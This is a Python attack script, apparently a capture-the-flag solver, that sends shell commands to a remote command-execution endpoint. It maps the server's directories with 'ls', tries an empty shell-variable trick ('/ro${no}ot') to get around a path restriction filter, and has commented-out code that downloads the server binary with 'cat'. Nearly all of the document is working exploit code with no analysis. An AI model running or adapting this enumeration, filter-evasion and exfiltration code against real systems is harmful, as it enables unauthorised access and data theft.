import aiohttp
import asyncio
import json
import os
import urllib

URL = "http://kattekilling.hkn:8080/execute"

async def execute(command: str, session: aiohttp.ClientSession) -> tuple[bool, bytes]:
    payload = {
        "command": command,
    }
    async with session.post(URL, data=payload) as response:
        if response.status == 200:
            text = await response.read()
            if b"Command output:" in text:
                output = text.split(b"Command output:")[1].strip()
                return True, output
            elif b"Access to directory is restricted" in text:
                return False, text
            elif b"Error executing command." in text:
                return False, text
            else:
                raise ValueError(f"Unexpected response format - {text}")
        else:
            raise ValueError(f"Unexpected status code - {response.status}")

async def get_files(path: str, session: aiohttp.ClientSession) -> list:
    success, output = await execute(f"ls -lah {path}", session)
    if success:
        files = output.decode().splitlines()
        return files
    else:
        print(f"Error getting files from {path}: {output}")
        return []

async def enumerate(session: aiohttp.ClientSession) -> dict:
    # dict for the filesystem
    filesystem = {}
    # queue of dirs to enumerate
    dirs_to_enumerate = ["/"]

    blacklist = [
        "/proc",
        "/sys",
        "/dev",
        "/run",
        "/tmp",
        "/var",
        "/boot",
        "/media",
        "/usr"
    ]

    while dirs_to_enumerate:
        current_dir = dirs_to_enumerate.pop(0)
        print(f"Enumerating {current_dir}")
        files = await get_files(current_dir, session)
        print(f"Found {len(files)} files in {current_dir}")
        if files:
            filesystem[current_dir] = files
            for file_line in files:
                file = file_line.split()[-1]
                if file not in [".", ".."] and file not in blacklist:
                    if file_line.startswith("d"):
                        # it's a directory
                        new_path = f"{current_dir}/{file}".replace("//", "/")
                        if new_path not in filesystem and new_path not in dirs_to_enumerate and new_path not in blacklist:
                            dirs_to_enumerate.append(new_path)
        else:
            print(f"Failed to get files from {current_dir}")
    
    # Write filesystem to a file
    with open("filesystem.json", "w") as f:
        json.dump(filesystem, f, indent=4)
    
    return filesystem


async def main():
    async with aiohttp.ClientSession() as session:
        # filesystem = await enumerate(session)
        files = await get_files("/ro${no}ot", session)
        print(files)

        # server_elf = await execute("cat $PWD/server", session)
        # if server_elf[0]:
        #     print("Server ELF:")
        #     with open("server", "wb") as f:
        #         f.write(server_elf[1])
        # else:
        #     print(f"Failed to get server ELF: {server_elf[1]}")




if __name__ == "__main__":
    # Change path to current directory
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    asyncio.run(main())